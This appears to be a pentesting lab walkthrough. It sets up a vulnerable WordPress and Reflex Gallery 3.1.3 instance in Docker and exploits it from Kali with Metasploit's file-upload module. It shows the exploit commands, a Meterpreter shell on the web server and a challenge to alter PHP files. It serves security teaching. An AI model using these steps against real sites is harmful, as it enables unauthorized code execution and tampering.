# WordPress vs. Kali, Round 2

Checklist before starting:
- [x] Have docker installed
- [x] Have kali linux image
- [x] Have pulled the wp_wordpress:4.2.2 and wp_db_data

If you need help with the above checklist, you can go 
[here](https://github.com/sammanthp007/WordPress-Pentesting-Setup)

Begin by stopping all the kali linux, wp and mysql db docker instances
```
/* stop the kali instance */
docker stop kali

/* stop the wp_wordpress and wp_db instances or any instances running using
docker-compose */
docker-compose stop && docker-compose rm -f

/* empty the database volume */
docker volume rm wp_db_data
```

If you have multiple versions of wordpress images, you can specify the version
you want to use in `.env`

Start kali linux instance and wp_container for wp_wordpress:4.2.2
```
/* start kali linux container */
docker start kali

/* start wp container */
docker-compose up -d --force-recreate
```

## Milestone 1
- [x] Opening an Attack Surface
1. In the WP admin console, go to the plugins page
2. Search for `reflex gallery` and you should see **Reflex Gallery >> WordPress
Photo Gallery**
3. Click on the result *don't install the plugin yet*. Look at the `Changelog`
tab.

Looks like 3.1.4 fixed a critical security issue (those are the best kind), so 
we should use 3.1.3. But you cannot use the convenient install button, because 
WP only lets you install the latest. You'll need to install it manually.

1. On the right side of the dialog, where it lists the compatibility and 
installs data, click the WordPress.org Plugin Page » link
2. You'll be taken to the official WP plugin page. Click on the 
[Developers tab](https://wordpress.org/plugins/reflex-gallery/developers/)
3. Under Other Versions, download the 
[3.1.3 zip file
](https://downloads.wordpress.org/plugin/reflex-gallery.3.1.3.zip)
4. Go to the manual plugin upload page and upload the zip
5. Go back to the plugins page, find the plugin, and click Activate

**Challenge** : Beyond activating the plugin, you need to use it in a page or 
a post on the WP instance. Create a gallery and use it in a page before 
proceeding

## Milestone 2
- [x] Recon

> Run the followning in a Kali container bash shell

So we know the blog is accessible from Kali at localhost:8000, but in this case,
localhost isn't really local because Kali is inheriting the host's networking 
configuration via docker. While this is fine for read-only operations, we need 
something a bit more specific than localhost to deliver a payload. Let's find 
the IP to use instead by running `ifconfig` and looking for the IP associated 
with eth0:

```
/* for codepath */
$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.65.2  netmask 255.255.255.248  broadcast 192.168.65.7

/* for me */
$ifconfig
br-273f1381003b: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 0.0.0.0
        inet6 fe80::42:3ff:fe74:10ed  prefixlen 64  scopeid 0x20<link>
        ether 02:42:03:74:10:ed  txqueuelen 0  (Ethernet)
        RX packets 60945  bytes 27436247 (26.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 108650  bytes 125750971 (119.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

## Milestone 3
- [ ] Hello, Metasploit
Metasploit is an exploitation framework. One of the most popular tools in Kali,
it's the free part of a larger, commercial project used widely in web security 
penetration testing. And by hackers. If wpscan is a dental pick, Metasploit is 
a set of carving knives.

Metasploit currently has over 1600 exploits, organized in different categories 
like:

* Browser-based: a large collection of (mostly) remote code execution exploits
* Mobile: Android, iOS
* OS-specific: Linux, Windows, Solaris, etc.
* Combinations of the above

Metasploit currently has hundreds of payloads. Some of them are:

* Command shells, enabling attackers to run scripts or arbitrary commands 
against a host
* Meterpreter payloads, enabling attackers to control the screen of a device 
using VNC and to browse, upload and download files
* Dynamic payloads, enabling attackers to evade anti-virus defenses by 
generating unique payloads

For this attack, we'll be using Meterpreter to open a shell into the target 
machine. 
[Read more about Meterpreter 
here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

First, though, some setup. Start by updating Metasploit:
```
$ msfupdate
```

Metasploit uses a database to manage exploit/payload information and also 
attack data. So you need to initialize the DB, then load the console:
```
$ service postgresql start
$ msfdb init
$ msfconsole
```

Fun fact: you get different ASCII art every time. And they say hackers don't 
care about UX. Note the command prompt has changed to `msf >`. You are now in a
shell within another shell within a container.

First check that the DB is connected OK. The DB isn't strictly necessary but 
MSF runs faster with it.
```
db_status

db_rebuild_cache

```
Now we are ready.

## Milestone 4: 
- [x] Pwnage
In MSF, start by searching the exploit database for something related to the 
plugin affected by the vulnerability. You could search on several different 
terms to find something, but in this case, the plugin has an unusual word in 
its name, "Reflex"

Search in MSF:
```
msf > search Reflex
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                              Disclosure Date  Rank       Description
   ----                                              ---------------  ----       -----------
   exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Wordpress Reflex Gallery Upload Vulnerability

```


Well, that sure looks handy. It's even ranked excellent, which should suggest
to you that not all of these tools are created equal. Some work better than
others; some don't work at all. In fact, what follows may not work perfectly
for you, so don't be too surprised if it doesn't go swimmingly. These are
hacks, after all: user-supported code and scripts whose primary purpose is to
compromise systems, so robustness isn't exactly a guarantee. Give it a shot,
but be prepared for some possible difficulty ahead.

To command to use the exploit is unsurprisingly called `use` and takes the
exploit's name as an argument. Once loaded, the command prompt changes again,
and you can run the `info` command.
```
msf > use exploit/unix/webapp/wp_reflexgallery_file_upload
msf exploit(wp_reflexgallery_file_upload) > info
```

Notice the output lists the affected version and some options we'll need to set:
```
Available targets:
  Id  Name
  --  ----
  0   Reflex Gallery 3.1.3

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST                       yes       The target address
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the wordpress application
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits an arbitrary PHP code upload in the WordPress
  Reflex Gallery version 3.1.3. The vulnerability allows for arbitrary
  file upload and remote code execution.

```

Use the `set` command to specify RHOST and RPORT accordingly. If your blog isn't
hosted at the root (/), you could additionally pass in the path by setting
TARGETURI (but the Docker setup should work with the default).

```
msf exploit(wp_reflexgallery_file_upload) > set RHOST 172.18.0.1
RHOST => localhost
msf exploit(wp_reflexgallery_file_upload) > set RPORT 8000
RPORT => 8000
```
You can probably guess the command used to run the exploit (it'll take a minute to run):
```
msf exploit(wp_reflexgallery_file_upload) > exploit

meterpreter >

```
Notice the command prompt changed to `meterpreter >`. The meterpreter payload
(GyWbjRCJnRSwE.php) was uploaded, executed, then deleted (just like campers,
hackers should leave no trace), and now we have a connection to the target
machine. Run the `shell` command when you see the `meterpreter >` prompt to load a
new shell:
```
meterpreter > shell
Process 63 created.
Channel 0 created.
```
A shell within a shell within a shell. But this shell is different; this shell
is running on the WordPress container. In case it's not clear, you really
shouldn't be able to do that. Notice the new shell spawned by Meterpreter
doesn't bother with command prompts at all, so it might just look like
nothing's happening after the process and channel are created. Try running some
commands, like `whoami` and `pwd`:
```
whoami
www-data

pwd
/var....

echo $HOSTNAME

exit
```
It's a low-fi shell, and somewhat limited, but it works, and it's enough to
compromise the whole machine. We can see we're shell'd in as the www-data user
and presently in one of the wordpress upload directories, which is where the
malicious PHP payload was delivered. We can also see the HOSTNAME matches the
docker container id.

The exit command above gets us back to the meterpreter > prompt,
which has fewer but more useable commands than the shell. For instance, we can
poke around with pwd, cd, ls, and cat:
```
meterpreter > pwd
/var/www/html/wp-content/uploads/2017/03
meterpreter > cd ../../..
meterpreter > pwd
/var/www/html/wp-content
meterpreter > ls
Listing: /var/www/html/wp-content
=================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  29    fil   2017-03-18 19:01:59 +0000  index.php
40755/rwxr-xr-x   4096  dir   2017-03-18 01:13:31 +0000  plugins
40755/rwxr-xr-x   4096  dir   2017-03-16 20:06:21 +0000  themes
40755/rwxr-xr-x   4096  dir   2017-03-18 01:13:31 +0000  upgrade
40755/rwxr-xr-x   4096  dir   2017-03-18 01:13:31 +0000  uploads

meterpreter > cat index.php
<?php
// Silence is golden.
```

## Milestone 5
- [x] Tag it

**Challenge**: Make a change to the WP content. You can open a vi editor from
`meterpreter >` using the `edit <file>` command. Use this to alter one of the PHP
files in some subtle, tasteful way. 

> [Meterpreter CheatSheet](https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/)

And that's pretty much game over for this scenario. Once an attacker is able to
gain this level of access, a whole universe of options suddenly opens up. If
the machine is configured appropriately, those options may be limited, but this
is not a position any sysadmin wants be in, even with everything configured
perfectly. In the best case scenario, the attack surface available to the
intruder is intolerably large.

## Milestone 6
- [x] Going Deeper

Nobody wants to be a script kiddie, and, sadly, in-memory DLL injection is
beyond the scope of our skills at this point, but we can at least look at the
exploit we just used and understand it. The link to the announcement and code
for this exploit is actually listed as part of the `wpscan` output from Milestone
2 (rapid7 is the company that sells the commercial version of Metasploit). From
there, you can get to [the code for this exploit in
Github.](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/wp_reflexgallery_file_upload.rb)
It's written in Ruby. Don't know Ruby? Doesn't matter. Let's look anyway:





